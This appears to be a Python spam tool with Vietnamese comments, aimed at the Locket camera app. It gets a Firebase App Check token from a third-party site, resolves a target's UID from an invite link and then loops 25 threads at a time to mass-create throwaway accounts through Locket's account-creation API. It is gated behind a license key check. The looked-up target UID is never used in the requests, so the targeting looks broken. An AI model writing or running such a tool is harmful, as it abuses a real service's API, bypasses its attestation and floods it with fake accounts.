# spammer.py (phiên bản có logic trích xuất UID được hoàn thiện và đã sửa lỗi)
import requests
import re
import random
import string
import threading
import time
from typing import Optional, Callable
from keygen import validate_key as validate_license_from_file

class SpamManager:
    def __init__(self):
        self.TOKEN_API_URL = "https://thanhdieu.com/api/v1/locket/token"
        self.API_LOCKET_URL = "https://api.locketcamera.com"
        self.REQUEST_TIMEOUT = 15
        self.FIREBASE_APP_CHECK_TOKEN = self._fetch_app_check_token()
        if not self.FIREBASE_APP_CHECK_TOKEN: 
            print("CRITICAL: Không thể lấy App Check Token từ API.")
        self.active_spam_sessions = {}
        self.last_error_message = ""
        
    def _fetch_app_check_token(self):
        try:
            res = requests.get(self.TOKEN_API_URL, timeout=self.REQUEST_TIMEOUT)
            res.raise_for_status() # Báo lỗi nếu status code là 4xx hoặc 5xx
            return res.json().get("data", {}).get("token")
        except requests.RequestException as e:
            print(f"Lỗi khi lấy App Check Token: {e}")
            return None
    
    def validate_license(self, key: str) -> dict:
        return validate_license_from_file(key)

    # =========================================================================
    # LOGIC TRÍCH XUẤT UID MỚI - HOÀN THIỆN
    # =========================================================================
    def _extract_uid_from_url(self, url: str) -> Optional[str]:
        if not url: return None
        # Biểu thức chính quy này tìm UID trong các link invite của Locket
        match = re.search(r'locket\.camera/invites/([a-zA-Z0-9]{28})', url)
        if match: return match.group(1)
        self.last_error_message = f"URL cuối cùng '{url}' không chứa UID hợp lệ."
        return None

    def find_locket_uid(self, user_input: str) -> Optional[str]:
        user_input = user_input.strip()
        self.last_error_message = "" 
        
        # Nếu người dùng không nhập link, tự động tạo link locket.cam
        url_to_check = f"https://locket.cam/{user_input}" if not re.match(r'^https?://', user_input) else user_input
        
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}
            # `allow_redirects=True` sẽ tự động theo các chuyển hướng HTTP 301/302
            response = requests.get(url_to_check, headers=headers, timeout=self.REQUEST_TIMEOUT, allow_redirects=True)
            response.raise_for_status()

            # Bước 1: Ưu tiên kiểm tra URL cuối cùng sau khi đã chuyển hướng
            uid = self._extract_uid_from_url(response.url)
            if uid:
                return uid

            # Bước 2: Nếu không được, tìm chuyển hướng bằng JavaScript trong nội dung trang
            js_redirect_match = re.search(r'window\.location\.href\s*=\s*"([^"]+)"', response.text)
            if js_redirect_match:
                redirected_url = js_redirect_match.group(1)
                uid_from_js = self._extract_uid_from_url(redirected_url)
                if uid_from_js:
                    return uid_from_js

            self.last_error_message = "Không thể tìm thấy link mời Locket trong trang."
            return None

        except requests.RequestException as e:
            self.last_error_message = f"Lỗi kết nối mạng: {e}"
            return None

    # =========================================================================
    # === CHANGED === Xóa tham số `num_threads` không cần thiết
    # =========================================================================
    def start_spam_session(self, user_id: int, target: str, update_callback: Callable):
        target_uid = self.find_locket_uid(target)
        if not target_uid:
            error_msg = f"Không thể tìm thấy Locket UID từ `{target}`."
            if self.last_error_message: error_msg += f"\nLý do: {self.last_error_message}"
            update_callback(status="error", message=error_msg)
            return

        if user_id in self.active_spam_sessions:
            update_callback(status="error", message="Bạn đã có một phiên spam đang chạy.")
            return

        stop_event = threading.Event()
        self.active_spam_sessions[user_id] = stop_event
        stats = {'success': 0, 'failed': 0, 'start_time': time.time()}
        
        def spam_loop():
            last_update = time.time()
            # update_callback(status="started") # Báo cho bot biết luồng đã bắt đầu
            
            while not stop_event.is_set():
                # Logic đã hard-code 25 luồng, nên không cần tham số `num_threads`
                threads = [threading.Thread(target=self._run_single_spam_thread, args=(target_uid, stop_event, stats)) for _ in range(25)]
                for t in threads: t.start()
                for t in threads: t.join() 
                
                # Cập nhật giao diện mỗi 2-3 giây
                if time.time() - last_update > 2.5:
                    update_callback(status="running", stats=stats)
                    last_update = time.time()

            # Khi vòng lặp kết thúc (do sự kiện stop), gửi cập nhật cuối cùng
            update_callback(status="stopped", stats=stats)
            if user_id in self.active_spam_sessions:
                del self.active_spam_sessions[user_id]
            
        session_thread = threading.Thread(target=spam_loop)
        session_thread.daemon = True
        session_thread.start()
        
    def _run_single_spam_thread(self, target_uid, stop_event, stats):
        if not self.FIREBASE_APP_CHECK_TOKEN:
            with threading.Lock(): stats['failed'] += 1
            return
        try:
            headers = {'Content-Type': 'application/json', 'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK_TOKEN}
            email = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=15))}@thanhdieu.com"
            password = 'zlocket' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=7))
            payload = {"data": {"email": email, "password": password, "client_email_verif": True, "platform": "ios"}}
            
            res = requests.post(f"{self.API_LOCKET_URL}/createAccountWithEmailPassword", headers=headers, json=payload, timeout=self.REQUEST_TIMEOUT)
            
            if stop_event.is_set(): return
            
            with threading.Lock(): # Đảm bảo cập nhật stats an toàn giữa các luồng
                if res.status_code == 200:
                    stats['success'] += 1
                else:
                    stats['failed'] += 1
        except:
            if not stop_event.is_set():
                with threading.Lock():
                    stats['failed'] += 1

    def stop_spam_session(self, user_id: int) -> bool:
        if user_id in self.active_spam_sessions:
            self.active_spam_sessions[user_id].set()
            return True
        return False
